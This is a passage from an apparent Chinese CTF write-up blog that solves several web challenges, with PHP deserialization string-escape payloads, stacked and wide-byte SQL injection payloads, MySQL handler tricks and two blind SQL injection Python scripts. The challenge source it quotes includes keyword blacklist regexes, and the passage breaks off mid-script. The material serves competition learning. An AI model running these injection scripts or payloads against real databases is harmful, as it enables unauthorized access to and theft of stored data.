class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$test=<span class=\"keyword\">new</span> UpdateHelper();</span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> Info();</span><br><span class=\"line\">$a-&gt;nickname=<span class=\"string\">''</span>;</span><br><span class=\"line\">$a-&gt;CtrlCase=$test;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urldecode(<span class=\"string\">'%09'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($a);</span><br><span class=\"line\"><span class=\"comment\">//O:4:\"Info\":3:&#123;s:3:\"age\";N;s:8:\"nickname\";s:0:\"</span></span><br><span class=\"line\"><span class=\"string\">\";s:8:\"</span>CtrlCase<span class=\"string\">\";O:12:\"</span>UpdateHelper<span class=\"string\">\":3:&#123;s:2:\"</span>id<span class=\"string\">\";N;s:7:\"</span>newinfo<span class=\"string\">\";N;s:3:\"</span>sql<span class=\"string\">\";O:4:\"</span>User<span class=\"string\">\":3:&#123;s:2:\"</span>id<span class=\"string\">\";N;s:3:\"</span>age<span class=\"string\">\";s:45:\"</span>select password,id from user where username=?<span class=\"string\">\";s:8:\"</span>nickname<span class=\"string\">\";O:4:\"</span>Info<span class=\"string\">\":3:&#123;s:3:\"</span>age<span class=\"string\">\";N;s:8:\"</span>nickname<span class=\"string\">\";s:0:\"</span><span class=\"string\">\";s:8:\"</span>CtrlCase<span class=\"string\">\";O:6:\"</span>dbCtrl<span class=\"string\">\":8:&#123;s:8:\"</span>hostname<span class=\"string\">\";s:9:\"</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">\";s:6:\"</span>dbuser<span class=\"string\">\";s:4:\"</span>root<span class=\"string\">\";s:6:\"</span>dbpass<span class=\"string\">\";s:4:\"</span>root<span class=\"string\">\";s:8:\"</span>database<span class=\"string\">\";s:4:\"</span>test<span class=\"string\">\";s:4:\"</span>name<span class=\"string\">\";s:5:\"</span>admin<span class=\"string\">\";s:8:\"</span>password<span class=\"string\">\";s:1:\"</span><span class=\"number\">1</span><span class=\"string\">\";s:6:\"</span>mysqli<span class=\"string\">\";N;s:5:\"</span>token<span class=\"string\">\";s:5:\"</span>admin<span class=\"string\">\";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>使用相应长度的字符逃逸</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">age=&amp;nickname=******************************************************************************************flagflag\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:&#123;s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:&#123;s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:&#123;s:3:\"age\";N;s:8:\"nickname\";s:0:\"\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:&#123;s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>得到MD5，解密，登录即可拿到flag</p>\n<h1 id=\"easysqli-copy\"><a href=\"#easysqli-copy\" class=\"headerlink\" title=\"easysqli_copy\"></a>easysqli_copy</h1><p>打开题目就是源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">    function check($str)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            print_r($matches);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $db = new PDO(<span class=\"string\">'mysql:host=localhost;dbname=pdotest'</span>,<span class=\"string\">'root'</span>,<span class=\"string\">'******'</span>);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    catch(Exception $e)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo $e-&gt;getMessage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(isset($_GET[<span class=\"string\">'id'</span>]))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $id = $_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $test = $db-&gt;query(\"select balabala from table1\");</span><br><span class=\"line\">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class=\"line\">        $id = $res[<span class=\"string\">'balabala'</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(check($id))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $query = <span class=\"string\">\"select balabala from table1 where 1=?\"</span>;</span><br><span class=\"line\">        $db-&gt;query(\"set names gbk\");</span><br><span class=\"line\">        $row = $db-&gt;prepare($query);</span><br><span class=\"line\">        $row-&gt;bindParam(1,$id);</span><br><span class=\"line\">        $row-&gt;execute();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>没有能在题目结束之前解出来，后面看到一篇<a href=\"http://www.52bug.cn/hkjs/6152.html\" target=\"_blank\" rel=\"noopener\">文章</a>，之前也看到一篇文章，不过只有上半部分。使用预编译加上16禁止就可以绕过</p>\n<p>编写盲注脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://localhost/1.php?id=1%df%27;set%20@x='</span>+payload+<span class=\"string\">';prepare%20a%20from%20@x;EXECUTE%20a;'</span></span><br><span class=\"line\">    html = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"comment\"># return html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2hex</span><span class=\"params\">(strs)</span>:</span></span><br><span class=\"line\">    he=<span class=\"string\">'0x'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> strs:</span><br><span class=\"line\">        he+=hex(ord(x))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    <span class=\"comment\"># print(he)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> he</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"select if(ascii(substr((%s),%d,1))&gt;%d,sleep(1),1)\"</span> % (s_payload,x, mid)</span><br><span class=\"line\">            payload=str2hex(payload)</span><br><span class=\"line\">            t1=time.time()</span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"comment\"># if res.status_code == 404 or res.status_code == 429:</span></span><br><span class=\"line\">            <span class=\"comment\">#     x=x-1</span></span><br><span class=\"line\">            <span class=\"comment\">#     error = 1</span></span><br><span class=\"line\">            <span class=\"comment\">#     break</span></span><br><span class=\"line\">            <span class=\"comment\"># html=res.text</span></span><br><span class=\"line\">            <span class=\"comment\"># print('*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> time.time()-t1&gt;=<span class=\"number\">1</span>:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tabls</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''</span>+db+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''</span>+table+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select group_concat('</span>+columns+<span class=\"string\">') from '</span>+table</span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">get_data(<span class=\"string\">'flag'</span>,<span class=\"string\">'table1'</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h1 id=\"blacklist\"><a href=\"#blacklist\" class=\"headerlink\" title=\"blacklist\"></a>blacklist</h1><p>打开题目是一个提交框，是强网杯 2019随便注改过来的，但是禁止了set，prepare，alter，rename。改表，预处理是不行了。</p>\n<p>测试时发现</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">preg_match(<span class=\"string\">\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\"</span>,$inject);</span><br></pre></td></tr></table></figure>\n\n<p>存在堆叠注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;?inject&#x3D;1%27||id;show tables;desc words;desc FlagHere;</span><br></pre></td></tr></table></figure>\n\n<p>返回结果如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;1&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;hahahah&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;2&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(12) &quot;miaomiaomiao&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(6) &quot;114514&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;ys&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(8) &quot;FlagHere&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(5) &quot;words&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;id&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;int(10)&quot;</span><br><span class=\"line\">  [2]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;NO&quot;</span><br><span class=\"line\">  [3]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [4]&#x3D;&gt;</span><br><span class=\"line\">  NULL</span><br><span class=\"line\">  [5]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(4) &quot;data&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(11) &quot;varchar(20)&quot;</span><br><span class=\"line\">  [2]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;NO&quot;</span><br><span class=\"line\">  [3]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [4]&#x3D;&gt;</span><br><span class=\"line\">  NULL</span><br><span class=\"line\">  [5]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(4) &quot;flag&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(12) &quot;varchar(100)&quot;</span><br><span class=\"line\">  [2]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;NO&quot;</span><br><span class=\"line\">  [3]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [4]&#x3D;&gt;</span><br><span class=\"line\">  NULL</span><br><span class=\"line\">  [5]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>flag 在FlagHere表中的flag列，经过测试语句应该是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;select data from words where id&#x3D;$_GET[id]&#39;</span><br></pre></td></tr></table></figure>\n\n<p>需要跨表查询，由于select被过滤，但是mysql还有一个handler可以使用（打比赛的时候没有找到，太可惜了）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload：1&#39;; handler FlagHere open; handler FlagHere read first; handler FlagHere close;#</span><br></pre></td></tr></table></figure>\n\n<p>如果表名是数字需要使用反撇号包裹。</p>\n<h1 id=\"Ezsqli\"><a href=\"#Ezsqli\" class=\"headerlink\" title=\"Ezsqli\"></a>Ezsqli</h1><p> 是一个提交窗口，经过测试过滤了如下字符0</p>\n<p><img src=\"/pic/111.png\" alt=\"\"></p>\n<p>后面又测试了一次，发现单独的or没有被过滤，*or就被过滤了</p>\n<p><img src=\"/pic/112.png\" alt=\"\"></p>\n<p>information_schema.tables可以使用<code>sys.schema_table_statistics_with_buffer</code>或<code>sys.schema_table_statistics_with_buffer</code>代替。</p>\n<p>数据使用无列名注入</p>\n<p>首先盲注获取数据库名</p>\n<p>附上脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 2/24/2020 11:21 AM</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2hex</span><span class=\"params\">(strs)</span>:</span></span><br><span class=\"line\">    hexs=<span class=\"string\">'0x'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(len(strs)):</span><br><span class=\"line\">        hexs+=hex(ord(strs[x]))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    <span class=\"comment\"># print(hexs)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hexs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url=<span class=\"string\">'http://0445a30e864f4cd8a6e4a54b3043663dd97491883a5749df.changame.ichunqiu.com/'</span></span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    data=&#123;</span><br><span class=\"line\">        <span class=\"string\">'id'</span>:<span class=\"string\">'0^('</span>+payload+<span class=\"string\">')'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    html = requests.post(url,data=data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\">            <span class=\"comment\"># t1=time.time()</span></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print(html,'*-*-*-*-*-*', mid,'    ',payload)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'Nu1L'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span 